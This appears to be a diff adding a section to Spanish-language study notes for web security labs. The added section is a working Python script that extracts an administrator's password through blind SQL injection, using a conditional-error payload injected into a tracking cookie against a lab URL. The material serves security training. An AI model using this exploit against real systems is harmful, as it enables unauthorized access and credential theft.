@@ -239,6 +239,73 @@ if __name__ == '__main__':
 Este ataque se haria con cluster bomb en burpsuite
 
 
+## Blind SQL injection with conditional errors
+
+
+ ```
+ #!/usr/bin/python3
+
+
+from pwn import *
+import requests, signal, time, pdb,sys, string#pdb para hacer debugging y 
+#string para definiciones de caracteres
+#import string
+#
+#string.ascii_lowercase
+#>>abcdef...
+#string.digits
+#>>012346...
+#string.puntuation
+#>> salentodoslossignosdepuntuacion
+#Para imprimirlos todos usa mayusculas minusculas etc
+#string.printable
+
+def def_handler(sig, frame):
+	print("\n\n [!] Saliendo.^.\n")
+	sys.exit(1)
+
+main_url="https://0a2200d1047ec74fc00b24b0006f00e7.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+
+def makeRequest():
+	password = ""
+
+	p1 = log.progress("Fuerza Bruta")
+	p1.status("Iniciando ataque de fuerza bruta")
+
+	time.sleep(2)
+
+	p2 = log.progress("Password")
+
+	for position in range(1,21):#Recordar lo hace del 1 al 20
+		for character in characters:
+
+			cookies = {
+
+'TrackingId': "Xfm9hCuGQC1XqZ3a'||(select case when substr(password,%d,1)='%s' then to_char(1/0) else '' end from users where username='administrator')||'" % (position,character),
+ 'session': 'JoJYflDsxURLxud6PJqjqKhiodDQjORM'
+			}
+
+			p1.status(cookies['TrackingId'])
+
+			r= requests.get(main_url,cookies=cookies)
+
+			if r.status_code == 500:
+				password += character
+				p2.status(password)
+				break#para que no continue probando el resto de caracteres!
+
+
+#Ctrl+C
+
+signal.signal(signal.SIGINT, def_handler)
+
+if __name__ == '__main__':
+	#time.sleep(10)
+	makeRequest()
+```
+
 # Bibliografia o Recursos Consultados
 
 > https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635
